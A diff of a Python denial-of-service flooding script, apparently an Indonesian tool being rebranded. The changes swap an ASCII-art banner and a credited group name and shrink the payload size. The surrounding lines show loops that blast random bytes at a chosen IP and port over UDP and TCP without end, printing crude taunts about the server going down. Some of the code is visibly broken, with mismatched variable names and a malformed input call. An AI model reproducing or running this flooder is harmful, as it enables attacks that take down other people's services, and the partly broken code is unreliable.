@@ -9,14 +9,16 @@ import times
  
  
  
-╔═╗─╔╗──────╔╗
-║║╚╗║║──────║║
-║╔╗╚╝╠══╦╗─╔╣╚═╦══╦══╗
-║║╚╗║║╔╗║║─║║╔╗║╔╗║║═╣
-║║─║║║╔╗║╚═╝║╚╝║╔╗║║═╣
-╚╝─╚═╩╝╚╩═╗╔╩══╩╝╚╩══╝
-────────╔═╝║
-────────╚══╝
+ ▒█████   ██▒   █▓▓█████  ██▀███   ██▓     ▒█████   ▄▄▄      ▓█████▄ 
+▒██▒  ██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌
+▒██░  ██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌
+▒██   ██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄  ▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌
+░ ████▓▒░   ▒▀█░  ░▒████▒░██▓ ▒██▒░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ 
+░ ▒░▒░▒░    ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ 
+  ░ ▒ ▒░    ░ ░░   ░ ░  ░  ░▒ ░ ▒░░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒ 
+░ ░ ░ ▒       ░░     ░     ░░   ░   ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░ 
+    ░ ░        ░     ░  ░   ░         ░  ░    ░ ░        ░  ░   ░    
+              ░                                               ░     
  
  
                          """)
@@ -30,7 +32,7 @@ times = int(input(" Masukan Theards Terserah "  ;)
 
 
 def naybae():
-    data = random._urandom(1024)
+    data = random._urandom(811)
     i = random.choice(("[naybae]","[naybae]","[naybae]"))
     while True:
         try:
@@ -38,7 +40,7 @@ def naybae():
             addr = (str(ip),int(port))
             for z in range(time):
                 s.sendto(data,addr)
-            print(i +" | Tok.. Tok.. Paket dari WillardZy |")
+            print(i +" | Tok.. Tok.. Paket dari Xy Comunity |")
         except:
             print("[!] | Server Down Kasihan !!!!! |")
 
@@ -52,7 +54,7 @@ def naybae2():
             s.send(data)
             for z in range(time):
                 s.send(data)
-            print(i +"| WillardZy nih bwang... |")
+            print(i +"| Xy Team nih bwang... |")
         except:
             s.close()
             print("[*] | Down lagi kontol.... |")
